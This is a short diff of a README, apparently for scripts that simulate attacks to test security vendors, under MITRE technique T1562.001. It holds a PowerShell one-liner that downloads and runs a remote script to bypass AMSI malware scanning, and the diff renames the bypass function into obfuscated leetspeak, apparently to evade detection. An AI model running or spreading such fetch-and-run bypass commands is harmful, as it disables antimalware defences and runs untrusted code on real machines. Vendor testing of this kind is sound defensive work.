@@ -43,7 +43,7 @@ https://attack.mitre.org/techniques/T1562/001/
 
 ### 1. AmsiScanBuffer
 
-`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI1.ps1"); Invoke-AmsiBypass1;`
+`PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/smgorelik/VendorSimTestScripts/main/Invoke-AMSI1.ps1"); Invoke-Am51Byp455;`
 
 ### 2. DllCanUnloadNowAddress (AmsiScanBuffer) Evasive
 A more evasive variant that also identifies AmsiScanBuffer function through a method called egg hunting
